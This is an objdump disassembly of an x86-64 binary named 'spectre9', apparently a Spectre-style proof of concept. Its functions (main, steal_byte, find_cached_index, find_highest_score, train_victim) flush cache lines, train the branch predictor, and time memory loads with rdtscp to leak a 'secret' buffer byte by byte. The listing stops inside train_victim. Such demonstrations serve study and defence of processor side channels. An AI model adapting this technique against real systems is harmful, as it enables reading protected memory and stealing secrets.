
spectre9:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x31b>
 248:	78 38                	js     282 <_init-0x30e>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 cb                	add    %cl,%bl
 285:	f8                   	clc    
 286:	c1 1b c6             	rcrl   $0xc6,(%rbx)
 289:	46 c0 b7 cb 9a 62 4d 	rex.RX shlb $0x33,0x4d629acb(%rdi)
 290:	33 
 291:	fa                   	cli    
 292:	63 3d 04 62 5b b3    	movslq -0x4ca49dfc(%rip),%edi        # ffffffffb35b649c <_end+0xffffffffb32b435c>

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	3a 00                	cmp    (%rax),%al
 2d2:	00 00                	add    %al,(%rax)
 2d4:	12 00                	adc    (%rax),%al
	...
 2e6:	00 00                	add    %al,(%rax)
 2e8:	4b 00 00             	rex.WXB add %al,(%r8)
 2eb:	00 20                	add    %ah,(%rax)
	...
 2fd:	00 00                	add    %al,(%rax)
 2ff:	00 0b                	add    %cl,(%rbx)
 301:	00 00                	add    %al,(%rax)
 303:	00 12                	add    %dl,(%rdx)
	...
 315:	00 00                	add    %al,(%rax)
 317:	00 28                	add    %ch,(%rax)
 319:	00 00                	add    %al,(%rax)
 31b:	00 12                	add    %dl,(%rdx)
	...
 32d:	00 00                	add    %al,(%rax)
 32f:	00 67 00             	add    %ah,0x0(%rdi)
 332:	00 00                	add    %al,(%rax)
 334:	20 00                	and    %al,(%rax)
	...
 346:	00 00                	add    %al,(%rax)
 348:	12 00                	adc    (%rax),%al
 34a:	00 00                	add    %al,(%rax)
 34c:	12 00                	adc    (%rax),%al
	...
 35e:	00 00                	add    %al,(%rax)
 360:	76 00                	jbe    362 <_init-0x22e>
 362:	00 00                	add    %al,(%rax)
 364:	20 00                	and    %al,(%rax)
	...
 376:	00 00                	add    %al,(%rax)
 378:	19 00                	sbb    %eax,(%rax)
 37a:	00 00                	add    %al,(%rax)
 37c:	22 00                	and    (%rax),%al
	...

Disassembly of section .dynstr:

0000000000000390 <.dynstr>:
 390:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 394:	63 2e                	movslq (%rsi),%ebp
 396:	73 6f                	jae    407 <_init-0x189>
 398:	2e 36 00 70 72       	cs add %dh,%ss:0x72(%rax)
 39d:	69 6e 74 66 00 6d 61 	imul   $0x616d0066,0x74(%rsi),%ebp
 3a4:	6c                   	insb   (%dx),%es:(%rdi)
 3a5:	6c                   	insb   (%dx),%es:(%rdi)
 3a6:	6f                   	outsl  %ds:(%rsi),(%dx)
 3a7:	63 00                	movslq (%rax),%eax
 3a9:	5f                   	pop    %rdi
 3aa:	5f                   	pop    %rdi
 3ab:	63 78 61             	movslq 0x61(%rax),%edi
 3ae:	5f                   	pop    %rdi
 3af:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 3b5:	7a 65                	jp     41c <_init-0x174>
 3b7:	00 5f 5f             	add    %bl,0x5f(%rdi)
 3ba:	6c                   	insb   (%dx),%es:(%rdi)
 3bb:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 3c2:	72 74                	jb     438 <_init-0x158>
 3c4:	5f                   	pop    %rdi
 3c5:	6d                   	insl   (%dx),%es:(%rdi)
 3c6:	61                   	(bad)  
 3c7:	69 6e 00 66 72 65 65 	imul   $0x65657266,0x0(%rsi),%ebp
 3ce:	00 47 4c             	add    %al,0x4c(%rdi)
 3d1:	49                   	rex.WB
 3d2:	42                   	rex.X
 3d3:	43 5f                	rex.XB pop %r15
 3d5:	32 2e                	xor    (%rsi),%ch
 3d7:	32 2e                	xor    (%rsi),%ch
 3d9:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 3de:	4d 5f                	rex.WRB pop %r15
 3e0:	64 65 72 65          	fs gs jb 449 <_init-0x147>
 3e4:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 3eb:	4d 
 3ec:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 3ee:	6f                   	outsl  %ds:(%rsi),(%dx)
 3ef:	6e                   	outsb  %ds:(%rsi),(%dx)
 3f0:	65 54                	gs push %rsp
 3f2:	61                   	(bad)  
 3f3:	62                   	(bad)  
 3f4:	6c                   	insb   (%dx),%es:(%rdi)
 3f5:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 3f9:	67 6d                	insl   (%dx),%es:(%edi)
 3fb:	6f                   	outsl  %ds:(%rsi),(%dx)
 3fc:	6e                   	outsb  %ds:(%rsi),(%dx)
 3fd:	5f                   	pop    %rdi
 3fe:	73 74                	jae    474 <_init-0x11c>
 400:	61                   	(bad)  
 401:	72 74                	jb     477 <_init-0x119>
 403:	5f                   	pop    %rdi
 404:	5f                   	pop    %rdi
 405:	00 5f 49             	add    %bl,0x49(%rdi)
 408:	54                   	push   %rsp
 409:	4d 5f                	rex.WRB pop %r15
 40b:	72 65                	jb     472 <_init-0x11e>
 40d:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 414:	4d 
 415:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 417:	6f                   	outsl  %ds:(%rsi),(%dx)
 418:	6e                   	outsb  %ds:(%rsi),(%dx)
 419:	65 54                	gs push %rsp
 41b:	61                   	(bad)  
 41c:	62                   	.byte 0x62
 41d:	6c                   	insb   (%dx),%es:(%rdi)
 41e:	65                   	gs
	...

Disassembly of section .gnu.version:

0000000000000420 <.gnu.version>:
 420:	00 00                	add    %al,(%rax)
 422:	02 00                	add    (%rax),%al
 424:	00 00                	add    %al,(%rax)
 426:	02 00                	add    (%rax),%al
 428:	02 00                	add    (%rax),%al
 42a:	00 00                	add    %al,(%rax)
 42c:	02 00                	add    (%rax),%al
 42e:	00 00                	add    %al,(%rax)
 430:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

0000000000000438 <.gnu.version_r>:
 438:	01 00                	add    %eax,(%rax)
 43a:	01 00                	add    %eax,(%rax)
 43c:	01 00                	add    %eax,(%rax)
 43e:	00 00                	add    %al,(%rax)
 440:	10 00                	adc    %al,(%rax)
 442:	00 00                	add    %al,(%rax)
 444:	00 00                	add    %al,(%rax)
 446:	00 00                	add    %al,(%rax)
 448:	75 1a                	jne    464 <_init-0x12c>
 44a:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 450:	3f                   	(bad)  
 451:	00 00                	add    %al,(%rax)
 453:	00 00                	add    %al,(%rax)
 455:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000458 <.rela.dyn>:
 458:	a8 1d                	test   $0x1d,%al
 45a:	20 00                	and    %al,(%rax)
 45c:	00 00                	add    %al,(%rax)
 45e:	00 00                	add    %al,(%rax)
 460:	08 00                	or     %al,(%rax)
 462:	00 00                	add    %al,(%rax)
 464:	00 00                	add    %al,(%rax)
 466:	00 00                	add    %al,(%rax)
 468:	00 07                	add    %al,(%rdi)
 46a:	00 00                	add    %al,(%rax)
 46c:	00 00                	add    %al,(%rax)
 46e:	00 00                	add    %al,(%rax)
 470:	b0 1d                	mov    $0x1d,%al
 472:	20 00                	and    %al,(%rax)
 474:	00 00                	add    %al,(%rax)
 476:	00 00                	add    %al,(%rax)
 478:	08 00                	or     %al,(%rax)
 47a:	00 00                	add    %al,(%rax)
 47c:	00 00                	add    %al,(%rax)
 47e:	00 00                	add    %al,(%rax)
 480:	c0 06 00             	rolb   $0x0,(%rsi)
 483:	00 00                	add    %al,(%rax)
 485:	00 00                	add    %al,(%rax)
 487:	00 08                	add    %cl,(%rax)
 489:	20 20                	and    %ah,(%rax)
 48b:	00 00                	add    %al,(%rax)
 48d:	00 00                	add    %al,(%rax)
 48f:	00 08                	add    %cl,(%rax)
 491:	00 00                	add    %al,(%rax)
 493:	00 00                	add    %al,(%rax)
 495:	00 00                	add    %al,(%rax)
 497:	00 08                	add    %cl,(%rax)
 499:	20 20                	and    %ah,(%rax)
 49b:	00 00                	add    %al,(%rax)
 49d:	00 00                	add    %al,(%rax)
 49f:	00 10                	add    %dl,(%rax)
 4a1:	21 20                	and    %esp,(%rax)
 4a3:	00 00                	add    %al,(%rax)
 4a5:	00 00                	add    %al,(%rax)
 4a7:	00 08                	add    %cl,(%rax)
 4a9:	00 00                	add    %al,(%rax)
 4ab:	00 00                	add    %al,(%rax)
 4ad:	00 00                	add    %al,(%rax)
 4af:	00 0c 21             	add    %cl,(%rcx,%riz,1)
 4b2:	20 00                	and    %al,(%rax)
 4b4:	00 00                	add    %al,(%rax)
 4b6:	00 00                	add    %al,(%rax)
 4b8:	18 21                	sbb    %ah,(%rcx)
 4ba:	20 00                	and    %al,(%rax)
 4bc:	00 00                	add    %al,(%rax)
 4be:	00 00                	add    %al,(%rax)
 4c0:	08 00                	or     %al,(%rax)
 4c2:	00 00                	add    %al,(%rax)
 4c4:	00 00                	add    %al,(%rax)
 4c6:	00 00                	add    %al,(%rax)
 4c8:	28 21                	sub    %ah,(%rcx)
 4ca:	20 00                	and    %al,(%rax)
 4cc:	00 00                	add    %al,(%rax)
 4ce:	00 00                	add    %al,(%rax)
 4d0:	d8 1f                	fcomps (%rdi)
 4d2:	20 00                	and    %al,(%rax)
 4d4:	00 00                	add    %al,(%rax)
 4d6:	00 00                	add    %al,(%rax)
 4d8:	06                   	(bad)  
 4d9:	00 00                	add    %al,(%rax)
 4db:	00 02                	add    %al,(%rdx)
	...
 4e5:	00 00                	add    %al,(%rax)
 4e7:	00 e0                	add    %ah,%al
 4e9:	1f                   	(bad)  
 4ea:	20 00                	and    %al,(%rax)
 4ec:	00 00                	add    %al,(%rax)
 4ee:	00 00                	add    %al,(%rax)
 4f0:	06                   	(bad)  
 4f1:	00 00                	add    %al,(%rax)
 4f3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 4fe:	00 00                	add    %al,(%rax)
 500:	e8 1f 20 00 00       	callq  2524 <__FRAME_END__+0x1770>
 505:	00 00                	add    %al,(%rax)
 507:	00 06                	add    %al,(%rsi)
 509:	00 00                	add    %al,(%rax)
 50b:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 511 <_init-0x7f>
 511:	00 00                	add    %al,(%rax)
 513:	00 00                	add    %al,(%rax)
 515:	00 00                	add    %al,(%rax)
 517:	00 f0                	add    %dh,%al
 519:	1f                   	(bad)  
 51a:	20 00                	and    %al,(%rax)
 51c:	00 00                	add    %al,(%rax)
 51e:	00 00                	add    %al,(%rax)
 520:	06                   	(bad)  
 521:	00 00                	add    %al,(%rax)
 523:	00 07                	add    %al,(%rdi)
	...
 52d:	00 00                	add    %al,(%rax)
 52f:	00 f8                	add    %bh,%al
 531:	1f                   	(bad)  
 532:	20 00                	and    %al,(%rax)
 534:	00 00                	add    %al,(%rax)
 536:	00 00                	add    %al,(%rax)
 538:	06                   	(bad)  
 539:	00 00                	add    %al,(%rax)
 53b:	00 08                	add    %cl,(%rax)
	...

Disassembly of section .rela.plt:

0000000000000548 <.rela.plt>:
 548:	c0 1f 20             	rcrb   $0x20,(%rdi)
 54b:	00 00                	add    %al,(%rax)
 54d:	00 00                	add    %al,(%rax)
 54f:	00 07                	add    %al,(%rdi)
 551:	00 00                	add    %al,(%rax)
 553:	00 01                	add    %al,(%rcx)
	...
 55d:	00 00                	add    %al,(%rax)
 55f:	00 c8                	add    %cl,%al
 561:	1f                   	(bad)  
 562:	20 00                	and    %al,(%rax)
 564:	00 00                	add    %al,(%rax)
 566:	00 00                	add    %al,(%rax)
 568:	07                   	(bad)  
 569:	00 00                	add    %al,(%rax)
 56b:	00 03                	add    %al,(%rbx)
	...
 575:	00 00                	add    %al,(%rax)
 577:	00 d0                	add    %dl,%al
 579:	1f                   	(bad)  
 57a:	20 00                	and    %al,(%rax)
 57c:	00 00                	add    %al,(%rax)
 57e:	00 00                	add    %al,(%rax)
 580:	07                   	(bad)  
 581:	00 00                	add    %al,(%rax)
 583:	00 06                	add    %al,(%rsi)
	...

Disassembly of section .init:

0000000000000590 <_init>:
 590:	48 83 ec 08          	sub    $0x8,%rsp
 594:	48 8b 05 4d 1a 20 00 	mov    0x201a4d(%rip),%rax        # 201fe8 <__gmon_start__>
 59b:	48 85 c0             	test   %rax,%rax
 59e:	74 02                	je     5a2 <_init+0x12>
 5a0:	ff d0                	callq  *%rax
 5a2:	48 83 c4 08          	add    $0x8,%rsp
 5a6:	c3                   	retq   

Disassembly of section .plt:

00000000000005b0 <.plt>:
 5b0:	ff 35 fa 19 20 00    	pushq  0x2019fa(%rip)        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
 5b6:	ff 25 fc 19 20 00    	jmpq   *0x2019fc(%rip)        # 201fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
 5bc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000005c0 <free@plt>:
 5c0:	ff 25 fa 19 20 00    	jmpq   *0x2019fa(%rip)        # 201fc0 <free@GLIBC_2.2.5>
 5c6:	68 00 00 00 00       	pushq  $0x0
 5cb:	e9 e0 ff ff ff       	jmpq   5b0 <.plt>

00000000000005d0 <printf@plt>:
 5d0:	ff 25 f2 19 20 00    	jmpq   *0x2019f2(%rip)        # 201fc8 <printf@GLIBC_2.2.5>
 5d6:	68 01 00 00 00       	pushq  $0x1
 5db:	e9 d0 ff ff ff       	jmpq   5b0 <.plt>

00000000000005e0 <malloc@plt>:
 5e0:	ff 25 ea 19 20 00    	jmpq   *0x2019ea(%rip)        # 201fd0 <malloc@GLIBC_2.2.5>
 5e6:	68 02 00 00 00       	pushq  $0x2
 5eb:	e9 c0 ff ff ff       	jmpq   5b0 <.plt>

Disassembly of section .plt.got:

00000000000005f0 <__cxa_finalize@plt>:
 5f0:	ff 25 02 1a 20 00    	jmpq   *0x201a02(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 5f6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000600 <_start>:
 600:	31 ed                	xor    %ebp,%ebp
 602:	49 89 d1             	mov    %rdx,%r9
 605:	5e                   	pop    %rsi
 606:	48 89 e2             	mov    %rsp,%rdx
 609:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 60d:	50                   	push   %rax
 60e:	54                   	push   %rsp
 60f:	4c 8d 05 4a 05 00 00 	lea    0x54a(%rip),%r8        # b60 <__libc_csu_fini>
 616:	48 8d 0d d3 04 00 00 	lea    0x4d3(%rip),%rcx        # af0 <__libc_csu_init>
 61d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 70a <main>
 624:	ff 15 b6 19 20 00    	callq  *0x2019b6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 62a:	f4                   	hlt    
 62b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000630 <deregister_tm_clones>:
 630:	48 8d 3d e9 1a 20 00 	lea    0x201ae9(%rip),%rdi        # 202120 <__TMC_END__>
 637:	55                   	push   %rbp
 638:	48 8d 05 e1 1a 20 00 	lea    0x201ae1(%rip),%rax        # 202120 <__TMC_END__>
 63f:	48 39 f8             	cmp    %rdi,%rax
 642:	48 89 e5             	mov    %rsp,%rbp
 645:	74 19                	je     660 <deregister_tm_clones+0x30>
 647:	48 8b 05 8a 19 20 00 	mov    0x20198a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 64e:	48 85 c0             	test   %rax,%rax
 651:	74 0d                	je     660 <deregister_tm_clones+0x30>
 653:	5d                   	pop    %rbp
 654:	ff e0                	jmpq   *%rax
 656:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 65d:	00 00 00 
 660:	5d                   	pop    %rbp
 661:	c3                   	retq   
 662:	0f 1f 40 00          	nopl   0x0(%rax)
 666:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 66d:	00 00 00 

0000000000000670 <register_tm_clones>:
 670:	48 8d 3d a9 1a 20 00 	lea    0x201aa9(%rip),%rdi        # 202120 <__TMC_END__>
 677:	48 8d 35 a2 1a 20 00 	lea    0x201aa2(%rip),%rsi        # 202120 <__TMC_END__>
 67e:	55                   	push   %rbp
 67f:	48 29 fe             	sub    %rdi,%rsi
 682:	48 89 e5             	mov    %rsp,%rbp
 685:	48 c1 fe 03          	sar    $0x3,%rsi
 689:	48 89 f0             	mov    %rsi,%rax
 68c:	48 c1 e8 3f          	shr    $0x3f,%rax
 690:	48 01 c6             	add    %rax,%rsi
 693:	48 d1 fe             	sar    %rsi
 696:	74 18                	je     6b0 <register_tm_clones+0x40>
 698:	48 8b 05 51 19 20 00 	mov    0x201951(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 69f:	48 85 c0             	test   %rax,%rax
 6a2:	74 0c                	je     6b0 <register_tm_clones+0x40>
 6a4:	5d                   	pop    %rbp
 6a5:	ff e0                	jmpq   *%rax
 6a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 6ae:	00 00 
 6b0:	5d                   	pop    %rbp
 6b1:	c3                   	retq   
 6b2:	0f 1f 40 00          	nopl   0x0(%rax)
 6b6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 6bd:	00 00 00 

00000000000006c0 <__do_global_dtors_aux>:
 6c0:	80 3d 59 1a 20 00 00 	cmpb   $0x0,0x201a59(%rip)        # 202120 <__TMC_END__>
 6c7:	75 2f                	jne    6f8 <__do_global_dtors_aux+0x38>
 6c9:	48 83 3d 27 19 20 00 	cmpq   $0x0,0x201927(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 6d0:	00 
 6d1:	55                   	push   %rbp
 6d2:	48 89 e5             	mov    %rsp,%rbp
 6d5:	74 0c                	je     6e3 <__do_global_dtors_aux+0x23>
 6d7:	48 8b 3d 2a 19 20 00 	mov    0x20192a(%rip),%rdi        # 202008 <__dso_handle>
 6de:	e8 0d ff ff ff       	callq  5f0 <__cxa_finalize@plt>
 6e3:	e8 48 ff ff ff       	callq  630 <deregister_tm_clones>
 6e8:	c6 05 31 1a 20 00 01 	movb   $0x1,0x201a31(%rip)        # 202120 <__TMC_END__>
 6ef:	5d                   	pop    %rbp
 6f0:	c3                   	retq   
 6f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 6f8:	f3 c3                	repz retq 
 6fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000700 <frame_dummy>:
 700:	55                   	push   %rbp
 701:	48 89 e5             	mov    %rsp,%rbp
 704:	5d                   	pop    %rbp
 705:	e9 66 ff ff ff       	jmpq   670 <register_tm_clones>

000000000000070a <main>:
 70a:	55                   	push   %rbp
 70b:	48 89 e5             	mov    %rsp,%rbp
 70e:	48 83 ec 20          	sub    $0x20,%rsp
 712:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 719:	eb 24                	jmp    73f <main+0x35>
 71b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 71e:	99                   	cltd   
 71f:	c1 ea 18             	shr    $0x18,%edx
 722:	01 d0                	add    %edx,%eax
 724:	0f b6 c0             	movzbl %al,%eax
 727:	29 d0                	sub    %edx,%eax
 729:	89 c1                	mov    %eax,%ecx
 72b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 72e:	48 63 d0             	movslq %eax,%rdx
 731:	48 8d 05 08 1a 20 00 	lea    0x201a08(%rip),%rax        # 202140 <array>
 738:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 73b:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 73f:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 746:	7e d3                	jle    71b <main+0x11>
 748:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 74f:	e9 b1 00 00 00       	jmpq   805 <main+0xfb>
 754:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 75b:	eb 1a                	jmp    777 <main+0x6d>
 75d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 760:	c1 e0 0c             	shl    $0xc,%eax
 763:	48 63 d0             	movslq %eax,%rdx
 766:	48 8d 05 d3 19 20 00 	lea    0x2019d3(%rip),%rax        # 202140 <array>
 76d:	48 01 d0             	add    %rdx,%rax
 770:	0f ae 38             	clflush (%rax)
 773:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 777:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 77e:	7e dd                	jle    75d <main+0x53>
 780:	0f ae f0             	mfence 
 783:	bf 00 04 00 00       	mov    $0x400,%edi
 788:	e8 53 fe ff ff       	callq  5e0 <malloc@plt>
 78d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 791:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 798:	eb 1e                	jmp    7b8 <main+0xae>
 79a:	8b 45 ec             	mov    -0x14(%rbp),%eax
 79d:	48 98                	cltq   
 79f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 7a6:	00 
 7a7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7ab:	48 01 d0             	add    %rdx,%rax
 7ae:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 7b4:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 7b8:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 7bf:	7e d9                	jle    79a <main+0x90>
 7c1:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 7c4:	48 98                	cltq   
 7c6:	48 8d 0d 13 19 20 00 	lea    0x201913(%rip),%rcx        # 2020e0 <secret>
 7cd:	48 8d 15 6c 18 20 00 	lea    0x20186c(%rip),%rdx        # 202040 <buffer>
 7d4:	48 29 d1             	sub    %rdx,%rcx
 7d7:	48 89 ca             	mov    %rcx,%rdx
 7da:	48 01 d0             	add    %rdx,%rax
 7dd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 7e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 7e5:	89 c2                	mov    %eax,%edx
 7e7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7eb:	89 d6                	mov    %edx,%esi
 7ed:	48 89 c7             	mov    %rax,%rdi
 7f0:	e8 42 02 00 00       	callq  a37 <steal_byte>
 7f5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7f9:	48 89 c7             	mov    %rax,%rdi
 7fc:	e8 bf fd ff ff       	callq  5c0 <free@plt>
 801:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 805:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 809:	0f 8e 45 ff ff ff    	jle    754 <main+0x4a>
 80f:	b8 00 00 00 00       	mov    $0x0,%eax
 814:	c9                   	leaveq 
 815:	c3                   	retq   

0000000000000816 <find_cached_index>:
 816:	55                   	push   %rbp
 817:	48 89 e5             	mov    %rsp,%rbp
 81a:	53                   	push   %rbx
 81b:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 81f:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 826:	eb 5a                	jmp    882 <find_cached_index+0x6c>
 828:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 82f:	00 
 830:	8b 45 ec             	mov    -0x14(%rbp),%eax
 833:	c1 e0 0c             	shl    $0xc,%eax
 836:	48 63 d0             	movslq %eax,%rdx
 839:	48 8d 05 00 19 20 00 	lea    0x201900(%rip),%rax        # 202140 <array>
 840:	48 01 d0             	add    %rdx,%rax
 843:	48 89 c3             	mov    %rax,%rbx
 846:	0f ae f0             	mfence 
 849:	0f 01 f9             	rdtscp 
 84c:	49 89 c2             	mov    %rax,%r10
 84f:	48 8b 0b             	mov    (%rbx),%rcx
 852:	0f 01 f9             	rdtscp 
 855:	4c 29 d0             	sub    %r10,%rax
 858:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 85c:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 861:	77 1b                	ja     87e <find_cached_index+0x68>
 863:	8b 45 ec             	mov    -0x14(%rbp),%eax
 866:	48 98                	cltq   
 868:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 86f:	00 
 870:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 874:	48 01 d0             	add    %rdx,%rax
 877:	8b 10                	mov    (%rax),%edx
 879:	83 c2 01             	add    $0x1,%edx
 87c:	89 10                	mov    %edx,(%rax)
 87e:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 882:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 889:	7e 9d                	jle    828 <find_cached_index+0x12>
 88b:	90                   	nop
 88c:	5b                   	pop    %rbx
 88d:	5d                   	pop    %rbp
 88e:	c3                   	retq   

000000000000088f <find_highest_score>:
 88f:	55                   	push   %rbp
 890:	48 89 e5             	mov    %rsp,%rbp
 893:	48 83 ec 20          	sub    $0x20,%rsp
 897:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 89b:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 8a2:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 8a9:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 8b0:	eb 3e                	jmp    8f0 <find_highest_score+0x61>
 8b2:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8b5:	48 98                	cltq   
 8b7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 8be:	00 
 8bf:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 8c3:	48 01 d0             	add    %rdx,%rax
 8c6:	8b 00                	mov    (%rax),%eax
 8c8:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 8cb:	7d 1f                	jge    8ec <find_highest_score+0x5d>
 8cd:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8d0:	89 45 f8             	mov    %eax,-0x8(%rbp)
 8d3:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8d6:	48 98                	cltq   
 8d8:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 8df:	00 
 8e0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 8e4:	48 01 d0             	add    %rdx,%rax
 8e7:	8b 00                	mov    (%rax),%eax
 8e9:	89 45 f4             	mov    %eax,-0xc(%rbp)
 8ec:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 8f0:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 8f7:	7e b9                	jle    8b2 <find_highest_score+0x23>
 8f9:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 8fc:	8b 55 f8             	mov    -0x8(%rbp),%edx
 8ff:	8b 45 f8             	mov    -0x8(%rbp),%eax
 902:	89 c6                	mov    %eax,%esi
 904:	48 8d 3d 6d 02 00 00 	lea    0x26d(%rip),%rdi        # b78 <_IO_stdin_used+0x8>
 90b:	b8 00 00 00 00       	mov    $0x0,%eax
 910:	e8 bb fc ff ff       	callq  5d0 <printf@plt>
 915:	90                   	nop
 916:	c9                   	leaveq 
 917:	c3                   	retq   

0000000000000918 <train_victim>:
 918:	55                   	push   %rbp
 919:	48 89 e5             	mov    %rsp,%rbp
 91c:	48 83 ec 10          	sub    $0x10,%rsp
 920:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 927:	e9 9a 00 00 00       	jmpq   9c6 <train_victim+0xae>
 92c:	48 8b 35 dd 17 20 00 	mov    0x2017dd(%rip),%rsi        # 202110 <x_is_safe>
 933:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 936:	ba 67 66 66 66       	mov    $0x66666667,%edx
 93b:	89 c8                	mov    %ecx,%eax
 93d:	f7 ea                	imul   %edx
 93f:	c1 fa 02             	sar    $0x2,%edx
 942:	89 c8                	mov    %ecx,%eax
